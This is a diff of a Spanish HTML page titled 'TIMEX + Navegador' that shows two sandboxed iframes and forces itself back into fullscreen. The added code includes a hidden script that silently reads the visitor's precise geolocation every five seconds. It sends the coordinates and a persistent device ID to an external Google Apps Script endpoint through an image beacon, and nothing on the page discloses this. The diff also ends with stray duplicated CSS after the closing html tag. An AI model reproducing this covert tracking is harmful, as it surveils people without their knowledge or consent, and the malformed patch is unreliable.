@@ -1,10 +1,9 @@
 <!doctype html>
 <html lang="es">
 <head>
-  
   <link rel="manifest" href="manifest.json">
   <meta name="theme-color" content="#000000">
-<meta charset="utf-8" />
+  <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
   <title>TIMEX + Navegador</title>
 
@@ -17,14 +16,12 @@
       overflow: hidden;
       background: #000;
     }
-
     body {
       position: fixed;
       inset: 0;
       touch-action: none;
       user-select: none;
     }
-
     .split {
       height: 100vh;
       width: 100vw;
@@ -32,8 +29,149 @@
       grid-template-columns: 1fr 2fr;
       gap: 0;
     }
-
     iframe {
+      width: 100%;
+      height: 100%;
+      border: 0;
+      display: block;
+    }
+    .left {
+      box-shadow: 1px 0 0 rgba(255,255,255,.12) inset;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="split">
+    <iframe
+      class="left"
+      src="PDF TIMEX.html"
+      title="TIMEX"
+      loading="eager"
+      sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-downloads allow-geolocation"
+      allow="geolocation *"
+    ></iframe>
+
+    <iframe
+      src="NAVEGADOR.html"
+      title="NAVEGADOR"
+      loading="eager"
+      sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-downloads allow-geolocation"
+      allow="geolocation *"
+    ></iframe>
+  </div>
+
+  <script>
+    function goFullscreen() {
+      const el = document.documentElement;
+      if (el.requestFullscreen) el.requestFullscreen();
+      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+      else if (el.msRequestFullscreen) el.msRequestFullscreen();
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      goFullscreen();
+      setTimeout(goFullscreen, 500);
+      setTimeout(goFullscreen, 1500);
+    });
+
+    document.addEventListener("fullscreenchange", () => {
+      if (!document.fullscreenElement) setTimeout(goFullscreen, 300);
+    });
+  </script>
+
+  <script>
+    // PWA
+    if ("serviceWorker" in navigator) {
+      window.addEventListener("load", () => {
+        navigator.serviceWorker.register("./service-worker.js", { scope: "./" })
+          .catch((err) => console.warn("SW register error:", err));
+      });
+    }
+  </script>
+
+  <script>
+    // ===== ENVÍO DE UBICACIÓN CADA 5s A GOOGLE SHEET (vía WebApp Apps Script) =====
+    (function () {
+      const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbzmwz0jzIPFmnjOEUl3eCy2EuXw1GtaKtSxkWcPT44soU2frtkghIUpBJ5bDv76vA1wQQ/exec";
+      const TOKEN = "1234";           // debe coincidir con Apps Script
+      const INTERVAL_MS = 5000;
+
+      // ID persistente por navegador
+      const DEVICE_ID_KEY = "coorvisor_device_id";
+      const deviceId = (() => {
+        try {
+          let id = localStorage.getItem(DEVICE_ID_KEY);
+          if (!id) {
+            id = (crypto && crypto.randomUUID) ? crypto.randomUUID()
+              : ("id-" + Math.random().toString(16).slice(2) + Date.now().toString(16));
+            localStorage.setItem(DEVICE_ID_KEY, id);
+          }
+          return id;
+        } catch {
+          return "unknown";
+        }
+      })();
+
+      let timer = null;
+
+      function sendGET(params) {
+        // Envío silencioso sin CORS
+        const qs = new URLSearchParams(params).toString();
+        const url = WEBAPP_URL + (WEBAPP_URL.includes("?") ? "&" : "?") + qs;
+        const img = new Image();
+        img.referrerPolicy = "no-referrer";
+        img.src = url;
+      }
+
+      function tick() {
+        if (!("geolocation" in navigator)) {
+          console.warn("Geolocalización no soportada.");
+          stop();
+          return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const c = pos.coords || {};
+            sendGET({
+              token: TOKEN,
+              lat: c.latitude ?? "",
+              lng: c.longitude ?? "",
+              acc: c.accuracy ?? "",
+              ts: new Date().toISOString(),
+              deviceId: deviceId
+            });
+          },
+          (err) => {
+            console.warn("Error obteniendo ubicación:", err);
+          },
+          {
+            enableHighAccuracy: true,
+            maximumAge: 0,
+            timeout: 8000
+          }
+        );
+      }
+
+      function start() {
+        if (timer) return;
+        tick();
+        timer = setInterval(tick, INTERVAL_MS);
+      }
+
+      function stop() {
+        if (!timer) return;
+        clearInterval(timer);
+        timer = null;
+      }
+
+      document.addEventListener("DOMContentLoaded", start);
+      window.CoorvisorLocation = { start, stop, deviceId };
+    })();
+  </script>
+</body>
+</html>
       width: 100%;
       height: 100%;
       border: 0;
